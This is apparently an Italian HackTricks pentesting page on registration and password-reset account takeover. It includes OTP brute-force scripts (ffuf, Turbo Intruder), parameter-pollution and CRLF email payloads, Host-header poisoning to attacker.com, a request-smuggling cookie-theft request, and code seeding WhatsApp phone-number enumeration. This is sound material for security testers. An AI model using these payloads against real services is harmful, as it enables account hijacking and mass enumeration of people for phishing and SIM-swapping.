# Vulnerabilità di registrazione e takeover

{{#include ../banners/hacktricks-training.md}}

## Registrazione Takeover

### Registrazione duplicata

- Prova a generare usando uno username esistente
- Prova a variare l'email:
- maiuscole/minuscole
- +1@
- aggiungi qualche punto nell'email
- caratteri speciali nel nome dell'email (%00, %09, %20)
- Inserisci caratteri vuoti dopo l'email: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Prova trucchi di canonicalizzazione del provider email (dipende dal servizio):
- Gmail ignora i punti e la subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` vengono consegnate a `victim@gmail.com`
- Alcuni provider non distinguono tra maiuscole/minuscole nella parte locale
- Alcuni provider accettano unicode confusables. Prova omoglyphs e soft hyphen `\u00AD` nella parte locale
- Abusa di questi per: bypassare i controlli di unicità, ottenere account duplicati/inviti al workspace, o bloccare le registrazioni della vittima (DoS temporaneo) mentre prepari un takeover

### Enumerazione username

Verifica se puoi capire quando uno username è già stato registrato all'interno dell'applicazione.

- Messaggi di errore diversi o codici di stato HTTP differenti
- Differenze di timing (un utente esistente può attivare lookup verso IdP/DB)
- Autocompletamento del form di registrazione con i dati del profilo per email conosciute
- Controlla i flussi team/invite: inserire un'email può rivelare se un account esiste

### Password Policy

Durante la creazione di un utente verifica la politica delle password (controlla se puoi usare password deboli).  
In tal caso potresti provare a bruteforceare le credenziali.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)to learn how to attempt account takeovers or extract information via **SQL Injections** in registry forms.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Cambia Email

Una volta registrato prova a cambiare l'email e verifica se questo cambiamento è correttamente validato o se puoi cambiarla con email arbitrarie.

### Altri controlli

- Verifica se puoi usare **disposable emails** (mailinator, yopmail, 1secmail, etc.) o bypassare la blocklist con subaddressing come `victim+mailinator@gmail.com`
- **Password** **lunghe** (>200) causano **DoS**
- Verifica i rate limit sulla creazione account
- Usa username@**burp_collab**.net e analizza la **callback**
- Se è usata la verifica tramite numero di telefono, controlla i casi limite di parsing/injection del numero

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / oracoli di enumerazione identificatori

I messaggeri incentrati sul numero di telefono espongono un **presence oracle** ogni volta che il client sincronizza i contatti. Il replay delle richieste di discovery di WhatsApp ha storicamente fornito **>100M lookups per hour**, permettendo enumerazioni quasi complete degli account.

**Workflow di attacco**

1. **Strumenta un client ufficiale** per catturare la richiesta di upload della rubrica (blob autenticato di numeri normalizzati in formato E.164). Riproducila con numeri generati dall'attaccante riutilizzando gli stessi cookie/token del dispositivo.
2. **Batch numbers per request**: WhatsApp accetta migliaia di identificatori e restituisce registrati/non registrati più metadata (business, companion, ecc.). Analizza le risposte offline per costruire liste di target senza messaggiare le vittime.
3. **Scalare orizzontalmente** l'enumerazione con SIM banks, dispositivi cloud o proxy residenziali in modo che il throttling per account/IP/ASN non si attivi mai.

**Modellazione del piano di numerazione**

Modella il piano di composizione di ogni paese per scartare candidati non validi. Il dataset NDSS (`country-table.*`) elenca prefissi nazionali, densità di adozione e ripartizione per piattaforma così puoi dare priorità alle fasce con più probabilità di successo. Codice di esempio per il seeding:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Dare priorità ai prefissi che corrispondono a allocazioni reali (Mobile Country Code + National Destination Code) prima di interrogare l'oracolo per mantenere il throughput utile.

**Trasformare le enumerazioni in attacchi mirati**

- Inserire leaked phone numbers (e.g., Facebook’s 2021 breach) nell'oracolo per scoprire quali identità sono ancora attive prima di phishing, SIM-swapping o spamming.
- Segmentare i censimenti per country/OS/app type per identificare regioni con weak SMS filtering o ampia adozione di WhatsApp Business per social engineering localizzato.

**Correlazione del riutilizzo di chiavi pubbliche**

WhatsApp espone la X25519 identity key di ogni account durante il setup della sessione. Richiedi identity material per ogni numero enumerato e deduplica le public keys per rivelare account farms, cloned clients o firmware insicuro — chiavi condivise deanonymize operazioni multi-SIM.

## Verifica Email/Phone debole (OTP/Magic Link)

I flussi di registrazione spesso verificano la proprietà tramite un OTP numerico o un magic-link token. Difetti tipici:

- OTP facilmente indovinabile o corto (4–6 digits) senza rate limiting efficace o tracciamento IP/device. Prova parallel guesses e header/IP rotation.
- Riutilizzo dell'OTP tra azioni o account, o non vincolato al specifico user/action (e.g., lo stesso codice funziona per login e signup, o funziona dopo che l'email è cambiata).
- Multi-value smuggling: alcuni backend accettano più codici e verificano se uno qualsiasi corrisponde. Prova:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: distinguere wrong vs expired vs wrong-user codes by status/message/body length.
- Token non invalidati dopo il successo o dopo cambio di password/email.
- Il verification token non è legato a user agent/IP permettendo il completamento cross-origin da pagine controllate dall'attaccante.

Esempio di bruteforcing con ffuf contro un endpoint JSON OTP:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Indovinamento parallelo/concorrenziale per bypassare i blocchi sequenziali (usa Turbo Intruder in Burp):

<details>
<summary>Snippet per Turbo Intruder per inondare tentativi di OTP a 6 cifre</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: invia lo stesso OTP valido simultaneamente in due sessioni; a volte una sessione diventa un account dell'attaccante verificato mentre il flusso della vittima riesce comunque.
- Test anche Host header poisoning sui link di verifica (come reset poisoning qui sotto) per leak o per completare la verifica su un host controllato dall'attaccante.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (prima che la vittima si registri)

Una potente classe di problemi si verifica quando un attaccante compie azioni sull'email della vittima prima che questa crei l'account, per poi recuperare l'accesso successivamente.

Tecniche chiave da testare (adattare ai flussi del target):

- Classic–Federated Merge
- Attaccante: registra un account classic con l'email della vittima e imposta una password
- Vittima: si registra successivamente con SSO (stesso indirizzo email)
- Merge insicuri possono lasciare entrambe le parti loggate o riportare in vita l'accesso dell'attaccante
- Unexpired Session Identifier
- Attaccante: crea un account e mantiene una sessione a lunga durata (non effettuare il logout)
- Vittima: recupera/imposta la password e usa l'account
- Testare se le vecchie sessioni restano valide dopo reset o abilitazione della MFA
- Trojan Identifier
- Attaccante: aggiunge un identificatore secondario all'account pre‑creato (telefono, email aggiuntiva, o collega l'IdP dell'attaccante)
- Vittima: resetta la password; l'attaccante poi usa il trojan identifier per resettare/loggare
- Unexpired Email Change
- Attaccante: avvia un cambio email verso la mail dell'attaccante e trattiene la conferma
- Vittima: recupera l'account e inizia a usarlo
- Attaccante: completa più tardi il cambio email pendente per rubare l'account
- Non‑Verifying IdP
- Attaccante: usa un IdP che non verifica la proprietà dell'email per affermare `victim@…`
- Vittima: si registra tramite la procedura classica
- Il servizio effettua merge sull'email senza controllare `email_verified` o eseguire una verifica locale

Suggerimenti pratici

- Raccogli i flussi e gli endpoint dai bundle web/mobile. Cerca classic signup, linking SSO, cambio email/telefono e endpoint di password reset.
- Crea automazioni realistiche per mantenere le sessioni attive mentre testi altri flussi.
- Per i test SSO, avvia un provider OIDC di test ed emetti token con claim `email` per l'indirizzo della vittima e `email_verified=false` per verificare se la RP si fida di IdP non verificati.
- Dopo qualsiasi password reset o cambio email, verifica che:
- tutte le altre sessioni e i token siano invalidati,
- le capacità di cambio email/telefono pendenti siano cancellate,
- gli IdP/email/telefoni precedentemente collegati siano ri‑verificati.

Nota: Metodologie estese e case study di queste tecniche sono documentate nella Microsoft’s pre‑hijacking research (vedi Riferimenti alla fine).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Richiedi il password reset per il tuo indirizzo email
2. Clicca sul link di password reset
3. Non cambiare la password
4. Clicca su qualsiasi sito di terze parti (eg: Facebook, twitter)
5. Intercetta la richiesta nel proxy di Burp Suite
6. Verifica se l'header referer sta leaking il password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercetta la richiesta di password reset in Burp Suite
2. Aggiungi o modifica i seguenti header in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Inoltra la richiesta con l'header modificato\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Cerca un URL di password reset basato sull'_host header_ come : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. L'attaccante deve effettuare il login con il proprio account e andare alla funzionalità **Change password**.
2. Avvia Burp Suite e intercetta la richiesta
3. Invia la richiesta alla scheda repeater ed modifica i parametri : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

The password reset token should be randomly generated and unique every time.\
Prova a determinare se il token scade o se è sempre lo stesso; in alcuni casi l'algoritmo di generazione è debole e può essere indovinato. Le seguenti variabili potrebbero essere usate dall'algoritmo.

- Timestamp
- UserID
- Email of User
- Firstname and Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence ( characters between \[A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Attiva una richiesta di reset della password usando l'API/UI per una email specifica e.g: test@mail.com
2. Ispeziona la risposta del server e verifica la presenza di `resetToken`
3. Poi usa il token in un URL come `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Registrati sul sistema con uno username identico a quello della vittima, ma con spazi bianchi inseriti prima e/o dopo lo username. e.g: `"admin "`
2. Richiedi il reset della password con il tuo username malevolo.
3. Usa il token inviato alla tua email e reimposta la password della vittima.
4. Accedi all'account della vittima con la nuova password.

La piattaforma CTFd è stata vulnerabile a questo attacco.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Trova una XSS dentro l'applicazione o in un sottodominio se i cookie sono impostati sul dominio principale : `*.domain.com`
2. Leak il cookie corrente **sessions cookie**
3. Autenticati come l'utente usando il cookie

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Usa **smuggler** per rilevare il tipo di HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Crea una request che sovrascriva il `POST / HTTP/1.1` con i seguenti dati:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` con l'obiettivo di effettuare un open redirect delle vittime verso burpcollab e rubare i loro cookie\
3. La request finale potrebbe apparire come la seguente
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone segnala lo sfruttamento di questo bug\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Account Takeover via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Crea un payload per il CSRF, e.g: “HTML form with auto submit for a password change”
2. Invia il payload

### Account Takeover via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token potrebbe essere usato per autenticare un utente.

- Modifica il JWT con un altro User ID / Email
- Verifica se la firma del JWT è debole


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

Alcuni signup handler eseguono un upsert quando l'email fornita esiste già. Se l'endpoint accetta un body minimale contenente email e password e non applica la verifica di proprietà, inviare l'email della vittima sovrascriverà la sua password pre-auth.

- Discovery: raccogli i nomi degli endpoint dal bundled JS (o dal traffico dell'app mobile), poi fuzz base path come /parents/application/v4/admin/FUZZ usando ffuf/dirsearch.
- Method hints: una GET che restituisce messaggi come "Only POST request is allowed." spesso indica il verbo corretto e che è atteso un body JSON.
- Body minimale osservato nel mondo reale:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Esempio di PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Impatto: Full Account Takeover (ATO) senza alcun reset token, OTP o verifica dell'email.

## Riferimenti

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
